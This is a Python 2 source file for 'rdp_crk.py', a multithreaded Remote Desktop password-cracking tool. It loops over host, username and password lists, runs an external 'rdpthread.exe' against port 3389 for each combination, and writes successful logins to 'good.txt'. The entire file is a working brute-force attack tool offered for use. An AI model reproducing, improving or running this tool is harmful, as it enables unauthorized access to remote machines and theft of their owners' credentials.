__author__ = 'sincoder@vip.qq.com'
import sys
import threading
import win32process
import win32event
import win32file
import time

thread_list = []
host_list = []
user_list = []
pass_list = []
lock = threading.Lock()


class CheckThread(threading.Thread):
    __host = ''
    __username = 'administrator'
    __password = '123456'
    __timeout = 5

    def __init__(self, host, username, password, timeout):
        threading.Thread.__init__(self)
        self.__host = host
        self.__username = username
        self.__password = password
        self.__timeout = timeout

    def run(self):
        global lock
        lock.acquire()
        print 'check ' + self.__host + ' '+self.__username +' ' + self.__password
        lock.release()
        cmd = 'rdpthread.exe rdp://' + self.__host + ':3389 --user "' + self.__username + '"  --pass "' + self.__password + '"'
        ret_code = 0
        try:
            ret_code = exec_timeout(cmd, self.__timeout)
        except:
            print 'error create process'
        if ret_code == 604:
            res = 'find ' + self.__host + ' ' + self.__username + ' ' + self.__password + '\r\n'
            lock.acquire()
            f = open('good.txt', 'a')
            #f.seek(f.tell())
            f.write(res)
            f.flush()
            f.close()
            lock.release()
        elif ret_code == 602:
            #pass error
            pass
        elif ret_code == 0:
            #connect error
            set_host_error(self.__host)
        else:
            #lock.acquire()
            set_host_error(self.__host)
            #print 'unknown ret code ' + str(ret_code)
            #lock.release()


def file_get_contents(filename):
    with open(filename) as f:
        return f.read()


def load_list_from_file(filename):
    word_list = ['']
    try:
        word_list = file_get_contents(filename).replace('\r', '').split('\n');
    except IOError:
        pass
    word_list = filter(None, word_list) #remove emptry string
    word_list = list(set(word_list)) #remove dup string
    return word_list


def exec_timeout(cmd, timeout=6):
    global lock
    exitCode = 0
    StartupInfo = win32process.STARTUPINFO()
    StartupInfo.hStdOutput = 0
    StartupInfo.hStdError = 0
    StartupInfo.hStdInput = 0
    StartupInfo.dwFlags = 0
    #lock.acquire()
    #print cmd
    #lock.release()
    try:
        hProcess, hThread, pid, dwTid = win32process.CreateProcess(None, cmd,
                                                                   None, None, 0,
                                                                   0, None, None,
                                                                   StartupInfo)
    except:
        print 'Create Process Failed !!'
        return False
    win32file.CloseHandle(hThread)
    if win32event.WaitForSingleObject(hProcess, timeout * 1000) == win32event.WAIT_OBJECT_0:
        exitCode = win32process.GetExitCodeProcess(hProcess)
        win32file.CloseHandle(hProcess)
        return exitCode
    else:
        #print 'try kill process'
        win32process.TerminateProcess(hProcess, 1)
        win32file.CloseHandle(hProcess)
        return False


def put_into_thread_list(t):
    global thread_list
    for n, x in enumerate(thread_list):
        if x == 0:
            thread_list[n] = t
            return True
    for n, x in enumerate(thread_list):
        if not x.isAlive():
            x.join()
            thread_list[n] = 0
    return False


def set_host_error(host):
    global host_list
    global lock
    lock.acquire()
    print 'put '+ host + ' into bad host !'
    for n, x in enumerate(host_list):
        if x == host:
            host_list[n] = ''
            break
    lock.release()


def main():
    global lock
    global thread_list
    global host_list
    global user_list
    global pass_list
    if len(sys.argv) < 3:
        print 'usage: rdp_crk.py [thread num] [timeout]\n'
        exit()
    thread_num = int(sys.argv[1])
    time_out = int(sys.argv[2])
    if thread_num > 1000:
        print 'thread num too big !'
        exit()
    host_list = load_list_from_file('host.txt')
    if len(host_list) < 1:
        print 'error open host file!'
        exit()
    user_list = load_list_from_file('user.txt')
    if len(user_list) < 1:
        print 'error open user text'
        exit()
    pass_list = load_list_from_file('pass.txt')
    if len(pass_list) < 1:
        print 'error open pass file '
        exit()

    thread_list = [0] * thread_num

    for u in user_list:
        for p in pass_list:
            for n, h in enumerate(host_list):
                lock.acquire()
                host = host_list[n]
                lock.release()
                if len(host) > 1:
                    t = CheckThread(host, u, p, time_out)
                    t.start()
                    while not put_into_thread_list(t):
                        continue
    for x in thread_list:
        if x != 0:
            x.join()

    print 'check over !'


if __name__ == '__main__':
    main()